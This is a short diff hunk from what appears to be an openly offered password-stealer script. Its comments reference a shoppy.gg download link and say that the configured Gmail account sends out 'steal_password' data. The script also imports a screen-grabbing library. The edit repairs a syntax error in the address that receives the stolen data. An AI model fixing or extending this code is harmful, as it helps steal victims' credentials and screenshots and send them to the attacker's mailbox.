@@ -20,7 +20,7 @@ from email import encoders
 # Link to Download https://shoppy.gg/@hakanonymos
 
 addr_from = 'your@gmail.com' # your email to send steal_password
-addr_to   'receive email  ' # receive email
+addr_to  =  'receive email  ' # receive email
 password  = 'password for gmail' # Your gmail password
 
 from PIL import ImageGrab
